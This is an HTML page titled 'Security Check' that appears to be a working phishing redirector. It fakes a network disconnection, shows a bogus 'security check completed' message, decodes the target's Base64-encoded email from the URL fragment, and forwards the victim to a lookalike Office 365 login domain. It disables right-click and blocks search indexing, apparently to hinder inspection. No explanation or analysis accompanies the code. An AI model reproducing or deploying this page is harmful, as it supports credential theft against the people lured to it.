<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <!-- Security Headers -->
    <meta name="robots" content="noindex, nofollow, noarchive"> <!-- Prevent indexing, following, and archiving -->
    <meta http-equiv="X-Content-Type-Options" content="nosniff"> <!-- Prevent MIME-type sniffing -->
    <meta http-equiv="X-Frame-Options" content="DENY"> <!-- Prevent clickjacking -->
    <meta http-equiv="X-XSS-Protection" content="1; mode=block"> <!-- Enable XSS protection -->
    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload"> <!-- Enforce HTTPS -->
    <meta http-equiv="Referrer-Policy" content="no-referrer"> <!-- Control referrer information -->
    
    <style>
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            position: relative;
        }

        .image-container {
            width: 100%;
            max-width: 900px;
        }

        .image-container img {
            width: 100%;
            height: auto;
            display: block;
        }

        .security-check {
            display: none;
            margin-top: 1rem;
            font-size: 1rem;
            color: #4CAF50;
            text-align: center;
            font-family: 'Arial', sans-serif;
            background-color: #f2f2f2;
            padding: 10px 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
        }
    </style>
</head>
<body oncontextmenu="return false;">
    <div class="container">
        <div class="image-container">
            <img src="https://pbs.twimg.com/media/GGrR89_WgAAgrOI?format=jpg&name=large" alt="Simulating Disconnection...">
        </div>
        <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
    </div>

    <script>
        (function() {
            'use strict';

            function getEmailFromHash() {
                try {
                    const hash = window.location.hash.substr(1);
                    return atob(hash); // Decodes the Base64 encoded email
                } catch (error) {
                    console.error("Failed to extract email from hash:", error);
                    return null;
                }
            }

            function populateEmail() {
                const email = getEmailFromHash();
                if (email) {
                    const emailField = document.getElementById("email");
                    if (emailField) {
                        emailField.value = email;
                    } else {
                        console.warn("Email field not found.");
                    }
                }
            }

            function simulateDisconnection() {
                console.log("Simulating disconnection for 10 seconds...");

                setTimeout(() => {
                    console.log("Reconnecting...");

                    const securityCheckMessage = document.querySelector('.security-check');
                    if (securityCheckMessage) {
                        securityCheckMessage.style.display = 'block';
                    }

                    setTimeout(() => {
                        // Redirect to the specified URL with the decoded email
                        const decodedEmail = getEmailFromHash();
                        const redirectTo = "https://l0g1n-micros.ftdocsportal.com/o365#" + decodedEmail.replace(/%40/g, '@');
                        window.location.href = redirectTo;
                    }, 6000);
                }, 10000);
            }

            window.onload = function() {
                simulateDisconnection();
                setTimeout(populateEmail, 10000);
            };
        })();
    </script>
</body>
</html>
